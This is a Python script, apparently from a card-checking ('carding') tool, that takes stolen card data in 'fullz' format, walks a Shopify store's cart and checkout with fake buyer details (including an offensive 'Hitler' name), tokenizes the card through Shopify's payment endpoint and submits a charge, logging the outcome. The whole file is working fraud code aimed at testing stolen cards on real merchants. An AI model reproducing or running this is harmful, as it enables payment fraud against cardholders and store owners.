import asyncio
import random
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from FUNC.defs import *


async def find_between(data, first, last):
    """Get text between two specified strings within a larger string.

    Args:
        data (str): The larger string to search within.
        first (str): The starting string to search for.
        last (str): The ending string to search for.

    Returns:
        str: The text found between the first and last strings, or False if not found.
    """
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return False


async def create_shopify_charge(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        cc1 = cc[:4]
        cc2 = cc[4:8]
        cc3 = cc[8:12]
        cc4 = cc[12:]
        user_agent = UserAgent().random
        random_data = await get_random_info(session)
        fname = random_data["fname"]
        lname = random_data["lname"]
        email = random_data["email"]
        phone = random_data["phone"]
        address = "First Street"
        city = "Mildura"
        state = "New South Wales"
        state_short = "NY"
        zip_code = "2946"

        link = open("FILES/product_link.txt").read()

        first_url = link
        first = await session.get(first_url)
        print("REQUEST 1 DONE .")
        variantId = await find_between(first.text, 'variantId":', ',')
        print(variantId)
        if not variantId:
            variantId =await find_between(first.text, 'ariant-id="', '"')
        if not first or not variantId:
            return "ERROR IN REQUEST 1"

        bs = BeautifulSoup(first.text, 'html.parser')
        hidden_tags = bs.find_all("input", type="hidden")
        a2c_data = {
            'id': variantId,
            'quantity': 1,
        }
        for x in hidden_tags:
            if 'properties' in x.get('name'):
                a2c_data[x.get('name')] = x.get('value')
        webname = urlparse(first_url).netloc

        second = await session.post(f'https://{webname}/cart/add.js',
                                    data=a2c_data,
                                    headers={'x-requested-with': 'XMLHttpRequest'},
                                    )
        print("REQUEST 2 DONE .")
        variantId =await find_between(second.text, '"id":', ',')
        if not second or not variantId:
            return second.text

        print(variantId)

        third = await session.get(f'https://{webname}/checkout')
        print("REQUEST 3 DONE .")
        if not third or not third.url:
            return 'ERROR IN REQUEST 1'

        four = await session.get(third.url)
        print("REQUEST 4 DONE .")
        authenticity_token =await find_between(
            four.text,
            '<input type="hidden" name="authenticity_token" value="', '"')
        if not four or not authenticity_token:
            return "ERROR IN REQUEST 4"

        print(authenticity_token)

        head_1 = {
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'contact_information',
            'step': 'shipping_method',
            'checkout[email]': "papajihitler@gmail.com",
            'checkout[buyer_accepts_marketing]': '0',
            'checkout[buyer_accepts_marketing]': '1',
            'checkout[shipping_address][first_name]': 'Hitler',
            'checkout[shipping_address][last_name]': 'Papa',
            'checkout[shipping_address][address1]': address,
            'checkout[shipping_address][address2]': '',
            'checkout[shipping_address][city]': "Mildura",
            'checkout[shipping_address][country]': 'AU',
            'checkout[shipping_address][province]': "New South Wales",
            'checkout[shipping_address][zip]': "2137",
            'checkout[shipping_address][phone]': "",
            'checkout[shipping_address][country]': 'Australia',
            'checkout[shipping_address][first_name]': 'Hitler',
            'checkout[shipping_address][last_name]': 'Papa',
            'checkout[shipping_address][address1]': address,
            'checkout[shipping_address][address2]': '',
            'checkout[shipping_address][city]': city,
            'checkout[shipping_address][province]': 'New South Wales',
            'checkout[shipping_address][zip]': "2137",
            'checkout[shipping_address][phone]': "",
            'checkout[note]': '',
            'checkout[client_details][browser_width]': '1349',
            'checkout[client_details][browser_height]': '629',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '-330'
        }

        five = await session.post(third.url, data=head_1)
        print("REQUEST 5 DONE .")
        if not five:
            return 'ERROR IN REQUEST 5'
        bs = BeautifulSoup(five.text, 'html.parser')
        hidden_tags = bs.find_all(
            "p", {'class': 'field__message field__message--error'})
        if hidden_tags:
            for x in hidden_tags:
                return x.getText()
            quit()
        if 'Shipping Method' in five.text or 'Shipping method' in five.text:
            d = await session.get(str(third.url) + '/shipping_rates?step=shipping_method')
        ship_tag = await find_between(
            d.text, '<div class="radio-wrapper" data-shipping-method="', '"')

        print(ship_tag)

        data = {
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'shipping_method',
            'step': 'payment_method',
            'checkout[shipping_rate][id]': ship_tag,
            'checkout[client_details][browser_width]': '1349',
            'checkout[client_details][browser_height]': '629',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '-330'
        }

        six = await session.post(third.url, data=data)
        print("REQUEST 6 DONE .")
        price =await find_between(six.text, '"payment_due":', '}')
        payment_gateway = await find_between(six.text,
                                       'data-subfields-for-gateway="', '"')

        h = {
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-Length': '166',
            'Content-Type': 'application/json',
            'Host': 'deposit.us.shopifycs.com',
            'Origin': 'https://checkout.shopifycs.com',
            'Referer': 'https://checkout.shopifycs.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Sec-GPC': '1',
            'User-Agent': user_agent
        }

        json_four = {
            "credit_card": {
                "number": cc,
                "name": "Crish Niki",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            "payment_session_scope": webname
        }

        seven = await session.post('https://deposit.us.shopifycs.com/sessions',
                                   json=json_four,
                                   )
        print("REQUEST 7 DONE .")
        west =await find_between(seven.text, '"id":"', '"')

        print(third.url)

        f_data = {
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'payment_method',
            'step': '',
            's': west,
            'checkout[payment_gateway]': payment_gateway,
            'checkout[credit_card][vault]': 'false',
            'checkout[different_billing_address]': 'false',
            'checkout[remember_me]': 'false',
            'checkout[remember_me]': '0',
            'checkout[vault_phone]': "",
            'checkout[total_price]': price,
            'complete': '1',
            'checkout[client_details][browser_width]': '674',
            'checkout[client_details][browser_height]': '662',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '-330',
        }

        checkout_url = third.url

        f_1 = await session.post(checkout_url, data=f_data)
        nigth =await session.get(f'{checkout_url}/processing')
        # await asyncio.sleep(5)
        g = await session.get(f'{checkout_url}/processing?from_processing_page=1')
        # print(g.text)
        url_g = str(g.url)
        url_g = await session.get(url_g)
        print(url_g.text)
        # await asyncio.sleep(5)
        try:
            response = find_between(url_g.text, '<p class="notice__text">', '</p></div></div>')
        except:
             return url_g
        # print(response)
        
        if response is None:
            try:
                    with open("FILES/result.txt", "a", encoding="UTF-8") as f:
                        f.write(f"{url_g}\n")
            except Exception as e:
                    pass
                    return response
        else:
                return url_g

    except Exception as e:
        return str(e)
